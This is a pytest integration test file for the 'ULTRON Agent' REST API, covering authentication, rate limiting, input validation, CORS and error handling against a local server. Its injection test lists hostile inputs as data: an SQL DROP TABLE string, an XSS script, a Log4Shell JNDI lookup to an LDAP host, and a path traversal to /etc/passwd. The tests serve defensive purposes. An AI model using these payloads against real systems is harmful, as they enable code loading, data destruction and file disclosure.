"""Integration tests for ULTRON Agent API endpoints.

This module tests the REST API endpoints including authentication,
rate limiting, error handling, and response validation.

Test Categories:
    - Authentication and authorization
    - Rate limiting enforcement
    - Input validation
    - Response format validation
    - Error handling
"""

import pytest
import json
import time

pytestmark = [pytest.mark.integration, pytest.mark.network]


class TestAPIEndpointHealth:
    """Test API server health check and availability."""

    def test_api_server_health_endpoint(self):
        """Test /health endpoint availability."""
        try:
            import requests

            response = requests.get(
                "http://localhost:5000/health",
                timeout=5
            )

            if response.status_code == 200:
                data = response.json()
                assert "status" in data, "Missing status in response"
            else:
                pytest.skip(f"API server returned {response.status_code}")

        except requests.ConnectionError:
            pytest.skip("API server not running on localhost:5000")

    def test_api_base_endpoint(self):
        """Test API server base endpoint."""
        try:
            import requests

            response = requests.get(
                "http://localhost:5000/",
                timeout=5
            )

            # Should return 200 or 404, but should respond
            assert response.status_code in [200, 404]

        except requests.ConnectionError:
            pytest.skip("API server not running")


class TestAuthenticationMiddleware:
    """Test API authentication and authorization."""

    def test_protected_endpoint_without_token(self):
        """Test that protected endpoints require authentication."""
        try:
            import requests

            # Try to access protected endpoint without token
            response = requests.get(
                "http://localhost:5000/api/agent/status",
                timeout=5
            )

            if response.status_code == 401:
                # Expected: unauthorized
                data = response.json()
                assert "error" in data or "message" in data
            elif response.status_code == 404:
                # Endpoint may not exist, that's okay
                pytest.skip("Protected endpoint not available")
            elif response.status_code == 200:
                # No auth required, also acceptable
                pass
            else:
                pytest.fail(f"Unexpected status: {response.status_code}")

        except requests.ConnectionError:
            pytest.skip("API server not running")

    def test_token_validation(self):
        """Test JWT token validation."""
        try:
            import requests

            # Try with invalid token format
            headers = {"Authorization": "Bearer invalid_token"}
            response = requests.get(
                "http://localhost:5000/api/agent/status",
                headers=headers,
                timeout=5
            )

            # Should fail gracefully
            assert response.status_code in [401, 404, 500]

        except requests.ConnectionError:
            pytest.skip("API server not running")

    def test_bearer_token_format(self):
        """Test Bearer token format handling."""
        try:
            import requests

            # Test various token formats
            test_cases = [
                "Bearer token123",
                "bearer token123",  # Lowercase
                "Token token123",   # Different scheme
                "token123",         # Missing Bearer
            ]

            for token_header in test_cases:
                headers = {"Authorization": token_header}
                response = requests.get(
                    "http://localhost:5000/api/agent/status",
                    headers=headers,
                    timeout=5
                )

                # Should handle all formats gracefully
                assert response.status_code in [200, 401, 404, 500]

        except requests.ConnectionError:
            pytest.skip("API server not running")


class TestRateLimiting:
    """Test API rate limiting enforcement."""

    @pytest.mark.timeout(30)
    def test_rate_limit_headers_present(self):
        """Test that rate limit headers are in responses."""
        try:
            import requests

            response = requests.get(
                "http://localhost:5000/health",
                timeout=5
            )

            if response.status_code == 200:
                # Check for common rate limit headers
                rate_limit_headers = [
                    "X-RateLimit-Limit",
                    "X-RateLimit-Remaining",
                    "X-RateLimit-Reset",
                    "RateLimit-Limit",
                    "RateLimit-Remaining",
                ]

                # At least one rate limit header should be present
                has_rate_limit = any(
                    h in response.headers for h in rate_limit_headers
                )

                # Rate limit headers are optional, so we just log this
                if has_rate_limit:
                    print("Rate limit headers detected")
                else:
                    print("No rate limit headers in response (may be okay)")

        except requests.ConnectionError:
            pytest.skip("API server not running")

    @pytest.mark.timeout(60)
    def test_rate_limiting_enforcement(self):
        """Test that rate limiting is enforced."""
        try:
            import requests

            # Make multiple rapid requests
            success_count = 0
            error_count = 0
            rate_limited = False

            for i in range(100):
                try:
                    response = requests.get(
                        "http://localhost:5000/health",
                        timeout=5
                    )

                    if response.status_code == 429:
                        # Rate limited!
                        rate_limited = True
                        break
                    elif response.status_code == 200:
                        success_count += 1
                    else:
                        error_count += 1

                except requests.exceptions.RequestException:
                    break

                # Small delay between requests
                time.sleep(0.01)

            # Just verify behavior is reasonable
            assert success_count > 0 or rate_limited, "No responses received"

        except requests.ConnectionError:
            pytest.skip("API server not running")


class TestInputValidation:
    """Test API input validation and sanitization."""

    def test_command_endpoint_input_validation(self):
        """Test that command endpoint validates input."""
        try:
            import requests

            # Test with empty command
            response = requests.post(
                "http://localhost:5000/api/command",
                json={"command": ""},
                timeout=5
            )

            # Should handle empty input gracefully
            assert response.status_code in [200, 400, 401]

        except requests.ConnectionError:
            pytest.skip("API server not running")

    def test_injection_prevention(self):
        """Test that API prevents injection attacks."""
        try:
            import requests

            # Test with SQL injection attempts
            malicious_inputs = [
                "'; DROP TABLE users; --",
                "<script>alert('xss')</script>",
                "${jndi:ldap://example.com/a}",
                "../../etc/passwd",
            ]

            for payload in malicious_inputs:
                response = requests.post(
                    "http://localhost:5000/api/command",
                    json={"command": payload},
                    timeout=5
                )

                # Should not reveal internal errors
                assert response.status_code != 500

                # Should not execute the payload
                if response.status_code == 200:
                    data = response.json()
                    # Verify response doesn't contain execution results
                    assert "Table" not in str(data)

        except requests.ConnectionError:
            pytest.skip("API server not running")


class TestResponseValidation:
    """Test API response format and content validation."""

    def test_json_response_format(self):
        """Test that API returns valid JSON."""
        try:
            import requests

            response = requests.get(
                "http://localhost:5000/health",
                timeout=5
            )

            if response.status_code == 200:
                try:
                    data = response.json()
                    assert isinstance(data, dict), "Response not JSON object"
                except json.JSONDecodeError:
                    pytest.fail("Response is not valid JSON")

        except requests.ConnectionError:
            pytest.skip("API server not running")

    def test_error_response_format(self):
        """Test that error responses follow expected format."""
        try:
            import requests

            # Request non-existent endpoint
            response = requests.get(
                "http://localhost:5000/api/nonexistent",
                timeout=5
            )

            if response.status_code == 404:
                try:
                    data = response.json()
                    # Error should have error message
                    assert any(
                        k in data for k in ["error", "message", "detail"]
                    )
                except json.JSONDecodeError:
                    pass  # Text response is okay for errors

        except requests.ConnectionError:
            pytest.skip("API server not running")

    def test_response_content_type(self):
        """Test that responses have correct Content-Type."""
        try:
            import requests

            response = requests.get(
                "http://localhost:5000/health",
                timeout=5
            )

            content_type = response.headers.get("Content-Type", "")

            if response.status_code == 200:
                # Should be JSON
                assert "application/json" in content_type or content_type == ""

        except requests.ConnectionError:
            pytest.skip("API server not running")


class TestCORSHeaders:
    """Test CORS (Cross-Origin Resource Sharing) headers."""

    def test_cors_headers_present(self):
        """Test that CORS headers are present in responses."""
        try:
            import requests

            response = requests.get(
                "http://localhost:5000/health",
                timeout=5,
                headers={"Origin": "http://localhost:8080"}
            )

            if response.status_code == 200:
                # Check for CORS headers
                cors_headers = [
                    "Access-Control-Allow-Origin",
                    "Access-Control-Allow-Methods",
                    "Access-Control-Allow-Headers",
                ]

                has_cors = any(h in response.headers for h in cors_headers)
                # CORS may or may not be enabled, just log
                print(f"CORS headers: {has_cors}")

        except requests.ConnectionError:
            pytest.skip("API server not running")


class TestErrorHandling:
    """Test API error handling and edge cases."""

    def test_timeout_handling(self):
        """Test handling of slow endpoints."""
        try:
            import requests

            # Request with very short timeout
            with pytest.raises((requests.Timeout, requests.ConnectionError)):
                requests.get(
                    "http://localhost:5000/health",
                    timeout=0.0001
                )
        except Exception:
            # Timeout or connection error is expected
            pass

    def test_invalid_json_payload(self):
        """Test handling of invalid JSON in request body."""
        try:
            import requests

            response = requests.post(
                "http://localhost:5000/api/command",
                data="invalid json {[",
                headers={"Content-Type": "application/json"},
                timeout=5
            )

            # Should reject invalid JSON
            assert response.status_code in [400, 422, 500]

        except requests.ConnectionError:
            pytest.skip("API server not running")

    def test_missing_required_fields(self):
        """Test handling of missing required request fields."""
        try:
            import requests

            # POST without required fields
            response = requests.post(
                "http://localhost:5000/api/command",
                json={},
                timeout=5
            )

            # Should handle missing fields gracefully
            assert response.status_code in [200, 400, 401, 422]

        except requests.ConnectionError:
            pytest.skip("API server not running")


# Test configuration
def pytest_configure(config):
    """Configure pytest markers for API tests."""
    config.addinivalue_line(
        "markers", "api: API endpoint integration tests"
    )
    config.addinivalue_line(
        "markers", "auth: Authentication and authorization tests"
    )
    config.addinivalue_line(
        "markers", "security: Security-focused tests"
    )


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
